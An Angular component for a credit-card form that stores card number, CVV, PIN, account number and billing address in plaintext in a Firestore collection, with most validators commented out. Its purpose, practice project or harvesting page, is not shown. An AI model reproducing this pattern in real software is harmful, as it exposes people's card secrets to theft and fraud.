import { Component } from '@angular/core';
import {FormBuilder, FormGroup, ReactiveFormsModule, Validators} from '@angular/forms';
import { Firestore, collection, addDoc } from '@angular/fire/firestore';

@Component({
  selector: 'app-credit-card',
  standalone: true,
  imports: [
    ReactiveFormsModule
  ],
  templateUrl: './credit-card.component.html',
  styleUrl: './credit-card.component.css'
})
export class CreditCardComponent {
  creditCardForm!: FormGroup;

  constructor(private fb: FormBuilder, private firestore: Firestore) {
    this.creditCardForm = this.fb.group({
      cardNumber: ['', [Validators.required, /*Validators.pattern('^[0-9]{16}$')*/]],
      cardholderName: ['', [Validators.required, Validators.minLength(3)]],
      expirationDate: ['', [Validators.required, /*Validators.pattern('(0[1-9]|1[0-2])/(\\d{2})')*/]],
      cvv: ['', [Validators.required, /*Validators.pattern('^[0-9]{3}$')*/]],
      billingAddress: ['', Validators.required],
      creditLimit: ['', [Validators.required, Validators.min(1000)]],
      accountNumber: ['', [Validators.required, /*Validators.pattern('^[0-9]{10,12}$')*/]],
      twoFactorAuth: [false],
      pin: ['', [Validators.required, /*alidators.pattern('^[0-9]{4}$')*/]]
    });
  }

  async onSubmit() {
    if (this.creditCardForm.valid) {
      const formData = {
        cardNumber: this.creditCardForm.value.cardNumber,
        cardholderName: this.creditCardForm.value.cardholderName,
        expirationDate: this.creditCardForm.value.expirationDate,
        cvv: this.creditCardForm.value.cvv,
        billingAddress: this.creditCardForm.value.billingAddress,
        creditLimit: this.creditCardForm.value.creditLimit,
        accountNumber: this.creditCardForm.value.accountNumber,
        twoFactorAuth: this.creditCardForm.value.twoFactorAuth,
        pin: this.creditCardForm.value.pin,
        submittedAt: new Date()
      };

      try {
        // Save the data to Firestore with auto-generated document ID
        await addDoc(collection(this.firestore, 'credit-card-info'), formData);
        console.log('Credit card info saved to Firestore');

        // Reset the form after submission
        this.creditCardForm.reset();
      } catch (error) {
        console.error('Error saving to Firestore:', error);
      }
    } else {
      console.log('Invalid Form');
    }
  }
}
